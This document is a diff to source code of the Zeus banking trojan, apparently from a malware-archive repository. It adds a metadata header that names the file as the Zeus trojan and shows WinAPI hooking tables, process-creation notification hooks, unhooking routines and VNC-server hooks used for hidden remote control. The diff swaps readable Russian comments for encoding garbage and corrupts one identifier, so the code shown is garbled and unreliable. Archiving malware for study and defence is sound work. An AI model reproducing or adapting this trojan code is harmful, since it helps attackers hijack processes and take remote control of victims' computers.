@@ -1,3 +1,14 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <wincrypt.h>
 #include <wininet.h>
@@ -38,9 +49,9 @@ void WinApiTables::uninit(void)
 }
 
 /*
-  Выбор функций для уведомлении о создании процесса.
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  OUT hwa - результат выбора.
+  OUT hwa - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void setCreateProcessNotifyApi(HOOKWINAPI *hwa)
 {
@@ -57,14 +68,14 @@ static void setCreateProcessNotifyApi(HOOKWINAPI *hwa)
 }
 
 /*
-  Снимает перехватыват со всеx WinApi из списка
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅx WinApi пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
-  IN process            - процесс.
-  IN OUT list           - список.
-  IN count              - кол. эелементов.
+  IN process            - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN OUT list           - пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN count              - пїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return                - true - если снять перехват со всех WinApi,
-                          false - если не снят перехват хотя бы с одной WinAPI.
+  Return                - true - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ WinApi,
+                          false - пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ WinAPI.
 */
 static bool unhookList(HANDLE process, HOOKWINAPI *list, DWORD count)
 {
@@ -220,7 +231,7 @@ static HOOKWINAPI userHooks[] =
   {NULL, VncServer::hookerGetDcEx,                      NULL, 0},
   {NULL, VncServer::hookerGetDc,                        NULL, 0},
   {NULL, VncServer::hookerGetWindowDc,                  NULL, 0},
-  {NULL, VncServer::hookerReleaseDс,                    NULL, 0},
+  {NULL, VncServer::hookerReleaseDпїЅ,                    NULL, 0},
   {NULL, VncServer::hookerGetUpdateRect,                NULL, 0},
   {NULL, VncServer::hookerGetUpdateRgn,                 NULL, 0},
   
